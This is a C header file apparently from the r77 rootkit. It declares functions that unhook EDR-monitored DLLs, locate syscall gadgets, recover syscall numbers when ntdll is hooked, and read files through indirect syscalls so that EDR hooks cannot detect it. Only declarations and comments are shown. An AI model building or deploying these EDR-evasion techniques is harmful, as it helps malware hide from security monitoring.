#include "r77mindef.h"
#ifndef _UNHOOK_H
#define _UNHOOK_H

/// <summary>
/// Unhooks all relevant DLLs that may be hooked by EDR.
/// </summary>
VOID Unhook();

/// <summary>
/// Initializes the indirect syscall function library by retrieving the necessary gadgets and syscall numbers.
/// </summary>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
static BOOL InitializeSyscalls();
/// <summary>
/// Unhooks a DLL by replacing the .text section with the original DLL section by using indirect syscalls.
/// </summary>
/// <param name="moduleName">The name of the DLL to unhook.</param>
/// <param name="moduleHash">The hash of the module name.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
static BOOL UnhookDll(LPCWSTR moduleName, DWORD moduleHash);

/// <summary>
/// Retrieves a pointer to a location in memory containing a syscall instruction, followed by a ret.
/// </summary>
/// <returns>
/// A pointer to the existing gadget, or NULL, if no gadget was found.
/// </returns>
static LPVOID GetSyscallGadget();
/// <summary>
/// Retrieves the syscall number for a given function name.
/// This works, even if the ntdll is hooked by EDR and the "mov eax" instruction was destroyed.
/// </summary>
/// <param name="functionName">The name of the function to search.</param>
/// <returns>
/// The equivalent syscall number, or -1, if the syscall number could not be determined.
/// </returns>
static DWORD GetSyscallNumber(PCHAR functionName);
/// <summary>
/// Reads a file from disk by using indirect syscalls.
/// This function cannot be detected by EDR hooks on ntdll.
/// </summary>
/// <param name="path">The path to the file to read.</param>
/// <param name="data">A pointer that is set to a newly allocated buffer with the file contents.</param>
/// <param name="size">A pointer to a DWORD value to write the size of the returned buffer to.</param>
/// <returns>
/// TRUE, if this function succeeds;
/// otherwise, FALSE.
/// </returns>
static BOOL SyscallReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size);

#endif